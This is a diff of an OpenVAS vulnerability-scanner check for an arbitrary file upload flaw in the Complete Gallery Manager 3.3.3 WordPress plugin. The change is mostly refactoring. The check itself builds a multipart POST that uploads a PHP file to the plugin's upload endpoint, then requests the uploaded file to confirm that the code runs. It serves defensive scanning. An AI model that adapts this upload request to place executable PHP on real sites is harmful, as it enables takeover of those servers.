@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_complete_gallery_file_upload_09_13.nasl 11497 2018-09-20 10:31:54Z mmartin $
+# $Id: gb_wordpress_complete_gallery_file_upload_09_13.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Wordpress Plugin Complete Gallery Manager 3.3.3 - Arbitrary File Upload Vulnerability
 #
@@ -30,10 +30,10 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103790");
-  script_version("$Revision: 11497 $");
+  script_version("$Revision: 13994 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2013-09-19 11:10:11 +0200 (Thu, 19 Sep 2013)");
   script_name("Wordpress Plugin Complete Gallery Manager 3.3.3 - Arbitrary File Upload Vulnerability");
   script_category(ACT_ATTACK);
@@ -59,7 +59,9 @@ if(description)
   other one to execute for example php codes.");
 
   script_tag(name:"solution", value:"Vendor updates are available.");
+
   script_tag(name:"solution_type", value:"VendorFix");
+
   script_tag(name:"summary", value:"Wordpress Complete Gallery Manager plugin is prone to a vulnerability
   that lets attackers upload arbitrary files. The issue occurs because the application
   fails to adequately sanitize user-supplied input.");
@@ -75,13 +77,17 @@ include("http_func.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-vtstring = get_vt_string( lowercase:TRUE );
+if(!port = get_app_port(cpe:CPE))
+  exit(0);
 
-if(!port = get_app_port(cpe:CPE))exit(0);
-if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
 
-file = vtstring + '_' + rand() +'.php';
-str  = vtstring + '_' + rand();
+host = http_host_name(port:port);
+
+vtstrings = get_vt_strings();
+file = vtstrings["lowercase_rand"] + '.php';
+str  = vtstrings["lowercase_rand"];
 
 ex = '------------------------------69c0e1752093\r\n' +
      'Content-Disposition: form-data; name="qqfile"; filename="' + file + '"\r\n' +
@@ -90,10 +96,7 @@ ex = '------------------------------69c0e1752093\r\n' +
      '<?php echo "' + str + '"; ?>\r\n' +
      '\r\n' +
      '------------------------------69c0e1752093--';
-
 len = strlen(ex);
-
-host = http_host_name(port:port);
 
 req = 'POST ' + dir + '/wp-content/plugins/complete-gallery-manager/frames/upload-images.php HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
@@ -103,12 +106,12 @@ req = 'POST ' + dir + '/wp-content/plugins/complete-gallery-manager/frames/uploa
       'Content-Type: multipart/form-data; boundary=----------------------------69c0e1752093\r\n\r\n';
 
 soc = open_sock_tcp(port);
-if(!soc)exit(0);
+if(!soc)
+  exit(0);
 
 send(socket:soc, data:req);
-
 while(x = recv(socket:soc, length:1024)) {
-   buf += x;
+  buf += x;
 }
 
 if(buf !~ "^HTTP/1\.[01] 100") {
@@ -124,16 +127,19 @@ while(y = recv(socket:soc, length:1024)) {
 
 close(soc);
 
-if('"success":true' >!< buf1)exit(99);
+if('"success":true' >!< buf1)
+  exit(99);
 
 url = eregmatch(pattern:'"url":"([^"]+)"', string:buf1);
-if(isnull(url[1]))exit(0);
+if(isnull(url[1]))
+  exit(0);
 
 path = url[1];
 path = str_replace(string:path,find:"\", replace:"");
 
 l_path = eregmatch(pattern:"(/wp-content/.*)", string:path);
-if(isnull(l_path[1]))exit(99);
+if(isnull(l_path[1]))
+  exit(99);
 
 url = dir + l_path[1];
 req1 = http_get(item:url, port:port);
